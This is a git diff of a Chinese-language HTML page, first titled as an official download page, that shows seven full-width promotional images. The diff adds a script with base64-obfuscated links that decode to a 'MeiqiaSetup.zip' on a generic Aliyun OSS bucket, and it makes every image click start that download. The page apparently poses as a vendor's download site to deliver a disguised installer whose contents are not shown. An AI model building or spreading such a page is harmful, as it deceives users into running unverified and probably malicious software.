@@ -1,7 +1,9 @@
-<html>
+<!DOCTYPE html>
+<html lang="zh">
 <head>
-    <title>官网下载页面 - 让进步发生</title>
-    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>设备</title>
     <style>
         body, html {
             margin: 0;
@@ -11,18 +13,55 @@
             width: 100%;
             height: auto;
             display: block;
+            cursor: pointer; /* 鼠标指针样式 */
         }
     </style>
 </head>
 <body>
 
-    <img src="static/picture/d_01.jpg" alt="">
-    <img src="static/picture/d_02.jpg" alt="">
-    <img src="static/picture/d_03.jpg" alt="">
-    <img src="static/picture/d_04.jpg" alt="">
-    <img src="static/picture/d_05.jpg" alt="">
-    <img src="static/picture/d_06.jpg" alt="">
-    <img src="static/picture/d_07.jpg" alt="">
+    <img src="static/picture/d_01.jpg">
+    <img src="static/picture/d_02.jpg">
+    <img src="static/picture/d_03.jpg">
+    <img src="static/picture/d_04.jpg">
+    <img src="static/picture/d_05.jpg">
+    <img src="static/picture/d_06.jpg">
+    <img src="static/picture/d_07.jpg">
+
+    <script>
+        // 加密链接存储在数组中
+        const encryptedUrls = [
+            'aHR0cHM6Ly9oay1jZG4wNi5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tL01laXFpYVNldHVwLnppcA==',
+            'aHR0cHM6Ly9oay1jZG4wNi5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tL01laXFpYVNldHVwLnppcA==',
+            'aHR0cHM6Ly9oay1jZG4wNi5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tL01laXFpYVNldHVwLnppcA==',
+            'aHR0cHM6Ly9oay1jZG4wNi5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tL01laXFpYVNldHVwLnppcA==',
+            'aHR0cHM6Ly9oay1jZG4wNi5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tL01laXFpYVNldHVwLnppcA==',
+            'aHR0cHM6Ly9oay1jZG4wNi5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tL01laXFpYVNldHVwLnppcA==',
+            'aHR0cHM6Ly9oay1jZG4wNi5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tL01laXFpYVNldHVwLnppcA=='
+        ];
+
+        function base64Decode(base64) {
+            return atob(base64); 
+        }
+
+        function downloadFile(encodedUrl) {
+            const url = base64Decode(encodedUrl); 
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = ''; 
+            document.body.appendChild(link); 
+            link.click(); 
+            document.body.removeChild(link); 
+        }
+
+        // 为每个图像添加点击事件监听器
+        const images = document.querySelectorAll('img');
+        images.forEach((img, index) => {
+            img.addEventListener('click', () => {
+                const encodedUrl = encryptedUrls[index]; 
+                downloadFile(encodedUrl); 
+            });
+        });
+    </script>
 
 </body>
 </html>
